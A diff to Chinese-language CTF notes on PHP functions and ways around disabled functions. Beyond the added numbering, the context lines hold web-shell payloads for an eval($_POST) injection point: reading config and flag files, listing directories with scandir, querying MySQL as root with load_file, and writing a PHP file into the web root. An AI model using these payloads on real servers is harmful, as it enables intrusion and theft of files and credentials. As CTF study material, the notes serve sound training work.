@@ -22,7 +22,7 @@ file_put_contents('/var/www/html/1.php',$a);
 ```
 
 ## **php常见特殊函数和绕过**
-**文件包含函数 绕过一些禁用函数**
+**1、文件包含函数 绕过一些禁用函数**
 如果是eval($_POST('c'))，直接蚁剑连，用插件绕过
 ```
 c=highlight_file("config.php");        //文件内容包含高亮。
@@ -44,7 +44,7 @@ c=require_once('/flag.txt');
 c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');foreach($dbh->query('select load_file("/flag36.txt")') as $row){echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e->getMessage();exit(0);}exit(0);
 
 ```
-查目录
+2、查目录
 ```
 c=var_dump(scandir('/'));
 
